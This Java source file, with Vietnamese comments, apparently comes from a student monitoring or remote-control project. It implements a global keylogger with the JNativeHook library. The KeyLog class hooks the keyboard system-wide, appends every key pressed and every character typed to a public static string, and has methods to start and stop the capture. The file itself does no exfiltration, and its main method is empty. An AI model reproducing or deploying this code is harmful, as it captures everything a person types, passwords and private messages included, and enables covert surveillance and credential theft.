package model;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.NativeInputEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.Toolkit;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;

import org.xml.sax.ext.Locator2Impl;

public class KeyLog implements NativeKeyListener {
	
	private Thread thread;
	public static String keylog = "";

	
	//Method bắt phím vừa nhấn
	public void nativeKeyPressed(NativeKeyEvent e) {
	
		//Bắt tên của phím vừa nhấn
		String key = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		//Nếu độ dài của phím bắt được lớn hơn 1, tức là Backspace ,... thì thêm vào string keylog
		if (key.length() > 1)
		{
			keylog += " " + key  ;
		}


	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	} 		 	
	
	//Bắt phím vừa nhận (Shift + a = A,...
	public void nativeKeyTyped(NativeKeyEvent e) {
		
		
		//Nếu là các kí tự đặt biệt, hoặc dấu cách, hoặc xuống dòng thì không nhận (vì đã nhận ở nativeKeyPressed)
		if (e.getKeyChar()=='' | e.getKeyChar() == ' ' | e.getKeyChar() == 13 )
		{
			return;
		}
		//Còn lại thì lưu vào keylog
		else {
			keylog = keylog + " " + e.getKeyChar();
		
			}
	
		
		//System.out.println(keylog);
	}
	
	public static void Keylogger(KeyLog keyLog)
	{
				//Bắt đầu bắt phím
				try {
					GlobalScreen.registerNativeHook();
					System.out.println("duoc ne ne");
				}
				catch (NativeHookException ex) {
					System.out.println("loi ne");
					System.err.println("There was a problem registering the native hook.");
					System.err.println(ex.getMessage());
					System.out.println("loi ne");
					System.exit(1);
				}

			    GlobalScreen.addNativeKeyListener(keyLog);
	
	}

				
	public static void UnKeyLogger(KeyLog keyLog) {
			//Kết thúc bắt phím
	
			try {
				//System.out.println(keylog);
	    		GlobalScreen.unregisterNativeHook();
	    		System.out.println("Out duoc roi");
	    		
			} catch (NativeHookException nativeHookException) {
	    		//nativeHookException.printStackTrace();
	    		System.out.println("Loi roi ne");
			}
			GlobalScreen.removeNativeKeyListener(keyLog);
	
			
		}
	public static void main(String[] args) {
		KeyLog keyLog = new KeyLog();
		
		//keyLog.Keylogger();
	}
}
//